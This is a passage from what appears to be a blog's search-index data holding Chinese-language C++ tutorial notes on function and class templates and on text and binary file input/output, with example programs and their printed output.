&quot; &lt;&lt; b &lt;&lt; endl; double c = 1.1; double d = 2.2; swapDouble(c, d); cout &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt; endl; cout &lt;&lt; &quot;d = &quot; &lt;&lt; d &lt;&lt; endl; mySwap(c, d); cout &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt; endl; cout &lt;&lt; &quot;d = &quot; &lt;&lt; d &lt;&lt; endl; //显式指定类型 mySwap&lt;double&gt;(c, d); cout &lt;&lt; &quot;c = &quot; &lt;&lt; c &lt;&lt; endl; cout &lt;&lt; &quot;d = &quot; &lt;&lt; d &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 总结 函数模板利用关键字template 使用函数模板有两种方式：自动类型推导，显示指定类型 模板的目的是为了提高复用性，将类型参数化 函数模板注意事项注意事项： 自动类型推导，必须推导出一致的数据类型T才可以使用 模板必须要确定出T的数据类型，才可以使用 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;using namespace std;//函数模板注意事项template&lt;typename T&gt;//typename可以替换成classvoid mySwap(T&amp; a, T&amp; b)&#123; T temp = a; a = b; b = temp;&#125;//1、自动类型推导，必须推导出一致的数据类型T才可以使用void test01()&#123; int a = 10; int b = 20; char c = &#x27;c&#x27;; mySwap(a, b);//正确； cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl; mySwap(a, c);//错误&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;using namespace std;//函数模板注意事项template&lt;typename T&gt;//typename可以替换成classvoid mySwap(T&amp; a, T&amp; b)&#123; T temp = a; a = b; b = temp;&#125;//1、自动类型推导，必须推导出一致的数据类型T才可以使用void test01()&#123; int a = 10; int b = 20; char c = &#x27;c&#x27;; mySwap(a, b);//正确； cout &lt;&lt; &quot;a = &quot; &lt;&lt; a &lt;&lt; endl; cout &lt;&lt; &quot;b = &quot; &lt;&lt; b &lt;&lt; endl;&#125;//2、模板必须要确定出T的数据类型，才可以使用 template&lt;typename T&gt;void func()&#123; cout &lt;&lt; &quot;func调用&quot; &lt;&lt; endl;&#125;void test02()&#123; func();&#125;int main()&#123; test01(); test02();&#125; 函数模板案例案例描述 利用函数模板封装一个排序的函数，可以对不同数据类型的数组进行排序 排序规则从大到小，排序算法为选择排序 分别利用char数组和int数组进行测试 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include &lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;using namespace std;template&lt;class T&gt;void mySwap(T&amp; a, T&amp; b)&#123; T temp = a; a = b; b = temp;&#125;template&lt;class T&gt;void mySort(T arr[], int len)&#123; for (int i = 0; i &lt; len; i++) &#123; int max = i; for (int j = i + 1; j &lt; len; j++) &#123; if (arr[max] &lt; arr[j]) &#123; max = j; &#125; &#125; if (max != i) &#123; mySwap(arr[max], arr[i]); &#125; &#125;&#125;template&lt;class T&gt;void printArray(T arr[], int len)&#123; for (int i = 0; i &lt; len; i++) &#123; cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;; &#125; cout &lt;&lt; endl;&#125;void test01()&#123; char charArr[] = &quot;badcfe&quot;; int num = sizeof(charArr) / sizeof(char); mySort(charArr, num); printArray(charArr, num);&#125;void test02()&#123; int intArr[] = &#123; 7,5,1,9,2,4,6,8 &#125;; int num = sizeof(intArr) / sizeof(int); mySort(intArr, num); printArray(intArr, num);&#125;int main()&#123; test01(); test02();&#125; 运行结果为： f e d c b a9 8 7 6 5 4 2 1 普通函数和函数模板的区别 普通函数调用时可以发生自动类型转换（隐式类型转换） 函数模板调用时，如果利用自动类型推导，不会发生隐式类型转换 如果利用显示指定类型的方式，可以发生隐式类型转换 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;using namespace std;//普通函数与函数模板区别//1、普通函数调用可以发生隐式类型转换//2、函数模板用自动类型推导，不可以发生隐式类型转换//3、函数模板用显示指定类型，可以发生隐式类型转换//普通函数int myAdd01(int a, int b)&#123; return a + b;&#125;//函数模板template&lt;class T&gt;T myAdd02(T a, T b)&#123; return a + b;&#125;void test01()&#123; int a = 10; int b = 20; char c = &#x27;c&#x27;; cout &lt;&lt; myAdd01(a, c) &lt;&lt; endl; //自动类型推导 不会发生隐式类型转换 //cout &lt;&lt; myAdd02(a, c) &lt;&lt; endl; //显示指定类型 会发生隐式类型转换 cout &lt;&lt; myAdd02&lt;int&gt;(a, c) &lt;&lt; endl;&#125;int main()&#123; test01();&#125; 运行结果为： 109109 普通函数与函数模板的调用规则调用规则如下： 如果函数模板和普通函数都可以实现，优先调用普通函数 可以通过空模板参数列表来强制调用函数模板 函数模板也可以发生重载 如果函数模板可以更好的匹配，有限调用函数模板 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//普通函数与函数模板的调用规则//1、如果函数模板和普通函数都可以调用，优先调用普通函数//2、可以通过空模板参数列表强制调用函数模板//3、函数模板可以发生函数重载//4、如果函数模板可以更好的匹配，优先调用函数模板void myPrint(int a, int b)&#123; cout &lt;&lt; &quot;调用的普通函数&quot; &lt;&lt; endl;&#125;template&lt;class T&gt;void myPrint(T a, T b)&#123; cout &lt;&lt; &quot;调用的模板&quot; &lt;&lt; endl;&#125;void test01()&#123; int a = 10; int b = 20; myPrint(a, b);&#125;int main()&#123; test01();&#125; 运行结果为： 调用的普通函数 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//普通函数与函数模板的调用规则//1、如果函数模板和普通函数都可以调用，优先调用普通函数//2、可以通过空模板参数列表强制调用函数模板//3、函数模板可以发生函数重载//4、如果函数模板可以更好的匹配，优先调用函数模板void myPrint(int a, int b);template&lt;class T&gt;void myPrint(T a, T b)&#123; cout &lt;&lt; &quot;调用的模板&quot; &lt;&lt; endl;&#125;void test01()&#123; int a = 10; int b = 20; //通过空模板参数列表，强制调用函数模板 myPrint&lt;&gt;(a, b);&#125;int main()&#123; test01();&#125; 运行结果为： 调用的模板 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//普通函数与函数模板的调用规则//1、如果函数模板和普通函数都可以调用，优先调用普通函数//2、可以通过空模板参数列表强制调用函数模板//3、函数模板可以发生函数重载//4、如果函数模板可以更好的匹配，优先调用函数模板void myPrint(int a, int b)&#123; cout &lt;&lt; &quot;调用的普通函数&quot; &lt;&lt; endl;&#125;template&lt;class T&gt;void myPrint(T a, T b)&#123; cout &lt;&lt; &quot;调用的模板&quot; &lt;&lt; endl;&#125;template&lt;class T&gt;void myPrint(T a, T b, T c)&#123; cout &lt;&lt; &quot;调用的重载模板&quot; &lt;&lt; endl;&#125;void test01()&#123; int a = 10; int b = 20; myPrint(a, b, 100);&#125;int main()&#123; test01();&#125; 运行的结果为： 调用的重载模板 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//普通函数与函数模板的调用规则//1、如果函数模板和普通函数都可以调用，优先调用普通函数//2、可以通过空模板参数列表强制调用函数模板//3、函数模板可以发生函数重载//4、如果函数模板可以更好的匹配，优先调用函数模板void myPrint(int a, int b)&#123; cout &lt;&lt; &quot;调用的普通函数&quot; &lt;&lt; endl;&#125;template&lt;class T&gt;void myPrint(T a, T b)&#123; cout &lt;&lt; &quot;调用的模板&quot; &lt;&lt; endl;&#125;template&lt;class T&gt;void myPrint(T a, T b, T c)&#123; cout &lt;&lt; &quot;调用的重载模板&quot; &lt;&lt; endl;&#125;void test01()&#123; //如果函数模板产生更好的匹配，优先调用函数模板 char c1 = &#x27;a&#x27;; char c2 = &#x27;b&#x27;; myPrint(c1, c2);&#125;int main()&#123; test01();&#125; 运行结果为： 调用的模板 模板的局限性模板并不是万能的 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//模板的局限性//模板并不是万能的，有些特定数据，需要具体化方式做特殊实现class Person&#123;public: Person(string name, int age) &#123; this-&gt;m_Name = name; this-&gt;m_Age = age; &#125; string m_Name; int m_Age;&#125;;//对比两个数据是否相等函数template&lt;class T&gt;bool myCompare(T&amp; a, T&amp; b)&#123; if (a == b) &#123; return true; &#125; else &#123; return false; &#125;&#125;//利用具体化Person的版本实现代码，具体化优先调用template&lt;&gt; bool myCompare(Person&amp; a, Person&amp; b)&#123; if (a.m_Age == b.m_Age &amp;&amp; a.m_Name == b.m_Name) return true; else return false;&#125;void test01()&#123; int a = 10; int b = 20; bool ret = myCompare(a, b); if (ret) &#123; cout &lt;&lt; &quot;a == b&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;a != b&quot; &lt;&lt; endl; &#125;&#125;void test02()&#123; Person p1(&quot;Tom&quot;, 10); Person p2(&quot;Tom&quot;, 10); bool ret = myCompare(p1, p2); if (ret) &#123; cout &lt;&lt; &quot;p1 == p2&quot; &lt;&lt; endl; &#125; else &#123; cout &lt;&lt; &quot;p1 != p2&quot; &lt;&lt; endl; &#125;&#125;int main()&#123; test01(); test02();&#125; 运行结果为： a !&#x3D; bp1 &#x3D;&#x3D; p2 总结： 利用具体化的模板，可以解决自定义类型的通用化 学习模板不是为了写模板，而是在STL能够运用系统提供的模板 类模板类模板语法类模板作用： 建立一个通用类，类中的成员数据类型可以不具体制定，用一个虚拟的类型来代表 123456789101112131415161718192021222324252627282930313233#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//类模板template&lt;class NameType,class AgeType&gt;class Person&#123;public: Person(NameType name, AgeType age) &#123; this-&gt;m_Name = name; this-&gt;m_Age = age; &#125; void showPerson() &#123; cout &lt;&lt; &quot;name: &quot; &lt;&lt; this-&gt;m_Name &lt;&lt; &quot; age: &quot; &lt;&lt; this-&gt;m_Age &lt;&lt; endl; &#125; NameType m_Name; AgeType m_Age;&#125;;void test01()&#123; Person&lt;string, int&gt; p1(&quot;孙悟空&quot;, 999); p1.showPerson();&#125;int main()&#123; test01();&#125; 运行结果为： name: 孙悟空 age: 999 类模板和函数模板的区别类模板与函数模板区别主要有两点 类模板没有自动类型推导的使用方式 类模板在模板参数列表中可以有默认参数 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//类模板template&lt;class NameType,class AgeType = int&gt;class Person&#123;public: Person(NameType name, AgeType age) &#123; this-&gt;m_Name = name; this-&gt;m_Age = age; &#125; void showPerson() &#123; cout &lt;&lt; &quot;name: &quot; &lt;&lt; this-&gt;m_Name &lt;&lt; &quot; age: &quot; &lt;&lt; this-&gt;m_Age &lt;&lt; endl; &#125; NameType m_Name; AgeType m_Age;&#125;;//1、类模板没有自动类型推导使用方式void test01()&#123; Person&lt;string&gt;p(&quot;孙悟空&quot;, 999); p.showPerson();&#125;int main()&#123; test01();&#125;int main()&#123; test01();&#125; 运行结果为： name: 孙悟空 age: 999 类模板中成员函数创建时机类模板中成员函数和普通类中成员函数创建时机是有区别的： 普通类中的成员一开始就可以创建 类模板中的成员函数在调用时才创建 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;class Person1&#123;public: void showPerson1() &#123; cout &lt;&lt; &quot;Person1 show&quot; &lt;&lt; endl; &#125;&#125;;class Person2&#123;public: void showPerson2() &#123; cout &lt;&lt; &quot;Person2 show&quot; &lt;&lt; endl; &#125;&#125;;template&lt;class T&gt;class Myclass&#123;public: T obj; //类模板中的成员函数 void func1() &#123; obj.showPerson1(); &#125; void func2() &#123; obj.showPerson2(); &#125;&#125;;void test01()&#123; Myclass&lt;Person1&gt;m; m.func1(); //m.func2();&#125;int main()&#123; test01();&#125; 运行结果为： Person1 show 类模板对象做函数参数类模板实例化出的对象，像函数传参的方式 一共有三种传入方式： 指定传入的类型 – 直接显示对象的数据类型（最常用） 参数模板化 – 将对象中的参数变为模板进行传递 整个类模板化 – 将这个对象类型模板化进行传递 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//类模板对象做函数参数template&lt;class T1,class T2&gt;class Person&#123;public: Person(T1 name, T2 age) &#123; this-&gt;m_Name = name; this-&gt;m_Age = age; &#125; void showPerson() &#123; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; this-&gt;m_Name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; this-&gt;m_Age &lt;&lt; endl; &#125; T1 m_Name; T2 m_Age;&#125;;//1、指定传入类型void printPerson1(Person&lt;string,int&gt;&amp;p)&#123; p.showPerson();&#125;void test01()&#123; Person &lt;string, int&gt;p(&quot;孙悟空&quot;, 999); printPerson1(p);&#125;//2、参数模板化template&lt;class T1,class T2&gt;void printPerson2(Person&lt;T1, T2&gt;&amp;p)&#123; p.showPerson(); cout &lt;&lt; &quot;T1的类型为： &quot; &lt;&lt; typeid(T1).name() &lt;&lt; endl; cout &lt;&lt; &quot;T2的类型为： &quot; &lt;&lt; typeid(T2).name() &lt;&lt; endl;&#125;void test02()&#123; Person&lt;string, int&gt;p(&quot;猪八戒&quot;, 888); printPerson2(p);&#125;//3、整个类模板化template&lt;class T&gt;void printPerson3(T&amp; p)&#123; p.showPerson(); cout &lt;&lt; &quot;T的类型为： &quot; &lt;&lt; typeid(T).name() &lt;&lt; endl;&#125;void test03()&#123; Person&lt;string, int&gt;p(&quot;唐僧&quot;, 30); printPerson3(p);&#125;int main()&#123; test01(); test02(); test03();&#125; 运行结果为： 姓名： 孙悟空 年龄： 999姓名： 猪八戒 年龄： 888T1的类型为： class std::basic_string&lt;char,struct std::char_traits,class std::allocator &gt;T2的类型为： int姓名： 唐僧 年龄： 30T的类型为： class Person&lt;class std::basic_string&lt;char,struct std::char_traits,class std::allocator &gt;,int&gt; 类模板与继承当类模板碰到继承时，需要注意以下几点： 当子类继承的父类是一个类模板时，子类在声明的时候，要指定出父类中T的类型 如果不指定，编译器无法给子类分配内存 如果想灵活指定出父类中T的类型，子类也需变为类模板 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//类模板与继承template&lt;class T&gt;class Base&#123; T m;&#125;;class Son :public Base&lt;int&gt;//必须要指导父类中的类型，才能继承给子类&#123;&#125;;void test01()&#123; Son s1;&#125;//如果想灵活指定父类中T的类型，子类也需要变为类模板template&lt;class T1,class T2&gt;class Son2 :public Base&lt;T2&gt;&#123; public: Son2() &#123; cout &lt;&lt; &quot;T1的类型为： &quot; &lt;&lt; typeid(T1).name() &lt;&lt; endl; cout &lt;&lt; &quot;T2的类型为： &quot; &lt;&lt; typeid(T2).name() &lt;&lt; endl; &#125; T1 obj;&#125;;void test02()&#123; Son2&lt;int, char&gt;s2;&#125;int main()&#123; test01(); test02();&#125; 运行结果为： T1的类型为： intT2的类型为： char 类模板成员函数类外实现学习目标：能够掌握类模板中的成员函数的类外实现 1234567891011121314151617181920212223242526272829303132333435363738#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//类模板成员函数类外实现template&lt;class T1,class T2&gt;class Person&#123;public: Person(T1 name, T2 age); void showPerson(); T1 m_Name; T2 m_Age;&#125;;//构造函数的类外实现template&lt;class T1,class T2&gt;Person&lt;T1, T2&gt;::Person(T1 name, T2 age)&#123; this-&gt;m_Name = name; this-&gt;m_Age = age;&#125;//成员函数的类外实现template&lt;class T1,class T2&gt;void Person&lt;T1, T2&gt;::showPerson()&#123; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; this-&gt;m_Name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; this-&gt;m_Age &lt;&lt; endl;&#125;void test01()&#123; Person&lt;string, int&gt; P(&quot;Tom&quot;, 20); P.showPerson();&#125;int main()&#123; test01();&#125; 运行结果为： 姓名： Tom 年龄： 20 类模板分文件编写掌握类模板成员函数分文件编写产生的问题以及解决方式 问题： 类模板中成员函数创建时机是在调用阶段，导致分文件编写时链接不到 解决： 解决方式1：直接包含.cpp源文件 解决方式2：将声明和实现写到同一个文件中，并更改后缀名为.hpp，hpp是约定的名称，并不是强制 person.h 123456789101112#pragma once#include&lt;iostream&gt;using namespace std;template&lt;class T1, class T2&gt;class Person&#123;public: Person(T1 name, T2 age); void showPerson(); T1 m_Name; T2 m_Age;&#125;; test.cpp 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;iostream&gt;#include&lt;string&gt;//第一种解决方式，直接包含源文件#include&quot;person.cpp&quot;//第二种解决方式，将.h和.cpp中的内容写到一起，将文件命名为.hpp文件using namespace std;//类模板份分文件编写问题以及解决//template&lt;class T1,class T2&gt;//class Person//&#123;//public:// Person(T1 name, T2 age);// void showPerson();// T1 m_Name;// T2 m_Age;//&#125;;//template&lt;class T1,class T2&gt;//Person&lt;T1, T2&gt;::Person(T1 name, T2 age)//&#123;// this-&gt;m_Name = name;// this-&gt;m_Age = age;//&#125;//template&lt;class T1,class T2&gt;//void Person&lt;T1,T2&gt;::showPerson()//&#123;// cout &lt;&lt; &quot;姓名：&quot; &lt;&lt; this-&gt;m_Name &lt;&lt; &quot; 年龄：&quot; &lt;&lt; this-&gt;m_Age &lt;&lt; endl;//&#125;void test01()&#123; Person&lt;string, int&gt; p(&quot;Jerry&quot;, 18); p.showPerson();&#125;int main()&#123; test01();&#125; person.cpp 123456789101112131415#include&lt;iostream&gt;#include&quot;person.h&quot;template&lt;class T1, class T2&gt;Person&lt;T1, T2&gt;::Person(T1 name, T2 age)&#123; this-&gt;m_Name = name; this-&gt;m_Age = age;&#125;template&lt;class T1, class T2&gt;void Person&lt;T1, T2&gt;::showPerson()&#123; cout &lt;&lt; &quot;姓名：&quot; &lt;&lt; this-&gt;m_Name &lt;&lt; &quot; 年龄：&quot; &lt;&lt; this-&gt;m_Age &lt;&lt; endl;&#125; 类模板和友元掌握类模板配合友元函数的类内和类外实现 全局函数类内实现 - 直接在类内声明友元即可 全局函数类外实现 - 需要提前让编译器知道全局函数的存在 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859#include &lt;iostream&gt;#include&lt;string&gt;using namespace std;//通过全局函数 打印Person信息//提前让编译器知道Person类存在template&lt;class T1, class T2&gt;class Person;//类外实现template&lt;class T1, class T2&gt;void printPerson2(Person&lt;T1, T2&gt;p)&#123; cout &lt;&lt; &quot;类外实现 -- 姓名： &quot; &lt;&lt; p.m_Name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; p.m_Age &lt;&lt; endl;&#125;template&lt;class T1,class T2&gt;class Person&#123; //全局函数 类内实现 friend void printPerson1(Person&lt;T1, T2&gt; p) &#123; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; p.m_Name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; p.m_Age &lt;&lt; endl; &#125; //全局函数 类外实现 //加空模板参数列表 //如果全局函数是类外实现，需要让编译器提前知道这个函数的存在 friend void printPerson2&lt;&gt;(Person&lt;T1, T2&gt; p);public: Person(T1 name, T2 age) &#123; this-&gt;m_Name = name; this-&gt;m_Age = age; &#125;private: T1 m_Name; T2 m_Age;&#125;;//1、全局函数在类内实现void test01()&#123; Person&lt;string, int&gt;p(&quot;Tom&quot;, 20); printPerson1(p);&#125;//2、全局函数在类外实现void test02()&#123; Person&lt;string, int&gt;p(&quot;Tom&quot;, 20); printPerson2(p);&#125;int main()&#123; test01(); test02();&#125; 运行结果为： 姓名： Tom 年龄： 20类外实现 – 姓名： Tom 年龄： 20 类模板案例实现一个通用的数组类，要求如下： 可以对内置的数据类型以及自定义数据类型的数据进行存储 将数组中的数据存储到堆区 构造函数中可以传入数组的容量 提供对应的拷贝构造函数以及operator&#x3D;防止浅拷贝问题 提供尾插法和尾删法对数组中的数据进行增加和删除 可以通过下标的方式访问数组中的元素 可以获取数组中当前元素个数和数组的容量 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include &lt;iostream&gt;#include&lt;string&gt;#include &quot;MyArray.hpp&quot;using namespace std;void printIntArray(MyArray&lt;int&gt;&amp;arr)&#123; for (int i = 0; i &lt; arr.getSize(); i++) &#123; cout &lt;&lt; arr[i] &lt;&lt; endl; &#125;&#125;//测试自定义数据类型class Person&#123;public: Person() &#123;&#125;; Person(string name, int age) &#123; this-&gt;m_Name = name; this-&gt;m_Age = age; &#125; string m_Name; int m_Age;&#125;;void printPersonArray(MyArray&lt;Person&gt;&amp; arr)&#123; for (int i = 0; i &lt; arr.getSize(); i++) &#123; cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; arr[i].m_Name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; arr[i].m_Age &lt;&lt; endl; &#125;&#125;void test01()&#123; MyArray&lt;int&gt;arr1(5); for (int i = 0; i &lt; 5; i++) &#123; arr1.push_back(i); &#125; cout &lt;&lt; &quot;arr1的打印输出为： &quot; &lt;&lt; endl; printIntArray(arr1); cout &lt;&lt; &quot;arr1的容量为： &quot; &lt;&lt; arr1.getCapacity() &lt;&lt; endl; cout &lt;&lt; &quot;arr1的大小为： &quot; &lt;&lt; arr1.getSize() &lt;&lt; endl; MyArray&lt;int&gt;arr2(arr1); cout &lt;&lt; &quot;arr2的打印输出为： &quot; &lt;&lt; endl; printIntArray(arr2); //尾删 arr2.pop_back(); cout &lt;&lt; &quot;arr2尾删后的打印输出为： &quot; &lt;&lt; endl; printIntArray(arr2); MyArray&lt;int&gt;arr3(100); arr3 = arr1;&#125;void test02()&#123; MyArray&lt;Person&gt;arr(10); Person p1(&quot;刘备&quot;, 999); Person p2(&quot;关羽&quot;, 800); Person p3(&quot;张飞&quot;, 700); Person p4(&quot;赵云&quot;, 800); Person p5(&quot;诸葛亮&quot;, 800); //将数据插入到数组中 arr.push_back(p1); arr.push_back(p2); arr.push_back(p3); arr.push_back(p4); arr.push_back(p5); cout &lt;&lt; &quot;arr的打印输出为：&quot; &lt;&lt; endl; printPersonArray(arr); cout &lt;&lt; &quot;arr的容量为： &quot; &lt;&lt; arr.getCapacity() &lt;&lt; endl; cout &lt;&lt; &quot;arr的大小为： &quot; &lt;&lt; arr.getSize() &lt;&lt; endl; arr.pop_back(); cout &lt;&lt; &quot;arr尾删后的打印输出为： &quot; &lt;&lt; endl; printPersonArray(arr);&#125;int main()&#123; test01(); test02();&#125; 运行结果为： MyArray的有参构造调用arr1的打印输出为：01234arr1的容量为： 5arr1的大小为： 5MyArray的拷贝构造调用arr2的打印输出为：01234arr2尾删后的打印输出为：0123MyArray的有参构造调用MyArray的operator&#x3D;调用MyArray的析构函数调用MyArray的析构函数调用MyArray的析构函数调用MyArray的有参构造调用arr的打印输出为：姓名： 刘备 年龄： 999姓名： 关羽 年龄： 800姓名： 张飞 年龄： 700姓名： 赵云 年龄： 800姓名： 诸葛亮 年龄： 800arr的容量为： 10arr的大小为： 5arr尾删后的打印输出为：姓名： 刘备 年龄： 999姓名： 关羽 年龄： 800姓名： 张飞 年龄： 700姓名： 赵云 年龄： 800MyArray的析构函数调用","categories":[{"name":"编程语言","slug":"编程语言","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"},{"name":"C++","slug":"编程语言/C","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/"},{"name":"语法","slug":"编程语言/C/语法","permalink":"http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/C/%E8%AF%AD%E6%B3%95/"}],"tags":[{"name":"C++","slug":"C","permalink":"http://example.com/tags/C/"}]},{"title":"C++学习 文件操作","slug":"C++-学习-文件操作","date":"2023-05-05T11:24:25.000Z","updated":"2023-05-09T08:11:31.953Z","comments":true,"path":"2023/05/05/C++-学习-文件操作/","link":"","permalink":"http://example.com/2023/05/05/C++-%E5%AD%A6%E4%B9%A0-%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/","excerpt":"程序运行时产生的数据都属于临时数据，程序一旦运行结束都会被释放 通过文件可以将数据持久化 C++中对文件操作需要包含头文件","text":"程序运行时产生的数据都属于临时数据，程序一旦运行结束都会被释放 通过文件可以将数据持久化 C++中对文件操作需要包含头文件 文件类型分类两种： 文本文件 - 文件以文本的ASCII码形式存储在计算机中 二进制文件 - 文件以文本的二进制形式存储在计算机中，用户一般不能直接读懂它们 操作文件的三大类： ofstream - 写操作 ifstream - 读操作 fstream - 读写操作 文本文件写文件写文件步骤 包含头文件 1#include&lt;fstream&gt; 创建流对象 1ofstream ofs; 打开文件 1ofs.open(&quot;文件路径&quot;,打开方式); 写数据 1ofs&lt;&lt;&quot;写入的数据&quot;; 关闭文件 1ofs.close(); 文件打开方式 打开方式 解释 ios::in 为读文件而打开文件 ios::out 为写文件打开文件 ios::ate 初始位置：文件尾 ios::app 追加方式写文件 ios::trunc 如果文件存在先删除，再创建 ios::binary 二进制方式 注意：文件打开方式可以配合使用，利用|操作符 例如：用二进制方式写文件 ios::binary | ios::out 案例12345678910111213141516171819202122232425#include &lt;iostream&gt;#include&lt;fstream&gt;using namespace std;//文本文件 写文件void test01()&#123; //1、包含头文件fstream //2、创建流对象 ofstream ofs; //3、指定打开方式 ofs.open(&quot;text.txt&quot;, ios::out); //4、写内容 ofs &lt;&lt; &quot;姓名：张三&quot; &lt;&lt; endl; ofs &lt;&lt; &quot;性别：男&quot; &lt;&lt; endl; ofs &lt;&lt; &quot;年龄：18&quot; &lt;&lt; endl; //5、关闭文件 ofs.close();&#125;int main()&#123; test01();&#125; 文件操作必须包含头文件fstream 读文件可以利用ofstream，或者fstream类 打开文件时需要指定操作文件的路径，以及打开方式 利用&lt;&lt;可以向文件中写数据 操作完毕，要关闭文件 读文件读文件步骤 包含头文件 1#include&lt;fstream&gt; 创建流对象 1ifstream ifs; 打开文件并判断文件是否打开成功 1ifs.open(&quot;文件路径&quot;,打开方式); 读数据 四种方式读取 关闭文件 1ifs.close(); 案例12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;using namespace std;//文本文件 读文件void test01()&#123; //1、包含头文件fstream //2、创建流对象 ifstream ifs; //3、打开文件 并且判断是否打开成功 ifs.open(&quot;text.txt&quot;, ios::in); if (!ifs.is_open()) &#123; cout &lt;&lt; &quot;文件打开失败&quot; &lt;&lt; endl; return; &#125; //4、读数据 cout &lt;&lt; &quot;第一种读数据--------------&quot; &lt;&lt; endl; char buf[1024] = &#123; 0 &#125;; while (ifs &gt;&gt; buf) &#123; cout &lt;&lt; buf &lt;&lt; endl; &#125; cout &lt;&lt; &quot;第二种读数据--------------&quot; &lt;&lt; endl; char buf1[1024] = &#123; 0 &#125;; while (ifs.getline(buf1, sizeof(buf1))) &#123; cout&lt;&lt;buf1&lt;&lt;endl; &#125; cout &lt;&lt; &quot;第三种读数据--------------&quot; &lt;&lt; endl; string buf2; while (getline(ifs, buf2)) &#123; cout &lt;&lt; buf2 &lt;&lt; endl; &#125; cout &lt;&lt; &quot;第四种读数据--------------&quot; &lt;&lt; endl; char c; while ((c = ifs.get()) != EOF) &#123; cout &lt;&lt; c; &#125; //5、关闭文件 ifs.close();&#125;int main()&#123; test01();&#125; 读文件可以利用ifstream，或者fstream类 利用is_open函数可以判断文件是否打开成功 close关闭文件 二进制文件以二进制的方式对文件进行读写操作 打开方式要指定为ios::bianary 写文件二进制方式写文件主要利用流对象调用成员函数write 函数原型：ostream&amp; write(const char* buffer,int len); 参数解释：字符指针buffer指向内存中一段存储空间。len是读写的字节数 12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;using namespace std;//二进制文件 写文件class Person&#123;public: char m_Name[64];//姓名 int m_Age;//年龄&#125;;void test01()&#123; //1、包含头文件 //2、创建流对象 ofstream ofs; //3、打开文件 ofs.open(&quot;person.txt&quot;, ios::out | ios::binary); //4、写文件 Person p = &#123; &quot;张三&quot;,18 &#125;; ofs.write((const char*)&amp;p, sizeof(Person)); //5、关闭文件 ofs.close();&#125;int main()&#123; test01();&#125; 文件输出流对象可以通过write函数，以二进制方式写函数 读文件二进制方式读文件主要利用流对象调用成员函数read 函数原型：istream&amp; read(char* buffer,int len); 参数解释：字符指针buffer指向内存中一段存储空间，len是读写的字节数 12345678910111213141516171819202122232425262728293031323334353637#include &lt;iostream&gt;#include&lt;fstream&gt;#include&lt;string&gt;using namespace std;//二进制文件 读文件class Person&#123;public: char m_Name[64];//姓名 int m_Age;//年龄&#125;;void test01()&#123; //1、包含头文件 //2、创建流对象 ifstream ifs; //3、打开文件 判断文件是否打开成功 ifs.open(&quot;person.txt&quot;, ios::in | ios::binary); if (!ifs.is_open()) &#123; cout &lt;&lt; &quot;文件打开失败&quot; &lt;&lt; endl; return; &#125; //4、读文件 Person p; ifs.read((char*)&amp;p, sizeof(Person)); cout &lt;&lt; &quot;姓名： &quot; &lt;&lt; p.m_Name &lt;&lt; &quot; 年龄： &quot; &lt;&lt; p.m_Age &lt;&lt; endl; //5、关闭文件 ifs.close();&#125;int main()&#123; test01();&#125; 运行结果为： 姓名： 张三 年龄： 